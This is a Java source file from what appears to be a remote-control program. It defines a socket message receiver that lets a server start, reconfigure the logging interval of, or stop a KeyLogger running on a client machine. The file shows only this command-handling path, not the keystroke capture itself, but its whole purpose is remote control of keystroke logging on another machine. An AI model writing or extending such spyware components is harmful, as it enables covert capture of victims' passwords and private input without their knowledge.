package SocketMessageReceiver.CustomUserReceiver;

import Client.KeyLogger;
import Server.EventDispatcher.EventHead.EventHeadByte;
import Server.EventDispatcher.SocketMessageGeneric;
import Server.ServerInstance.Sender;
import SocketMessageReceiver.DataType.ChangeKeyLogConfigRequest;
import SocketMessageReceiver.SocketMessageReceiver;

public class ChangeKeyLogConfigReceiver extends SocketMessageReceiver<ChangeKeyLogConfigRequest> {
    @Override
    public byte getHeadByte() {
        return EventHeadByte.USER_DATA;
    }

    @Override
    public byte getSubHeadByte() {
        return EventHeadByte.UserData.CHANGE_KEY_LOG_CONFIG;
    }

    @Override
    protected void onExecute(Sender server, SocketMessageGeneric<ChangeKeyLogConfigRequest> socketMsg) {
        var keyLogger = KeyLogger.instance;
        var isWriteLog = socketMsg.msg.isWriteLog;
        var writeLogInterval = socketMsg.msg.writeLogInterval;

        if (isWriteLog && keyLogger != null && keyLogger.interval != writeLogInterval) {
            keyLogger.stop();

            keyLogger = new KeyLogger(writeLogInterval);
            keyLogger.start();

            KeyLogger.instance = keyLogger;
        }

        if (!isWriteLog && keyLogger != null){
            keyLogger.stop();
        }
    }
}
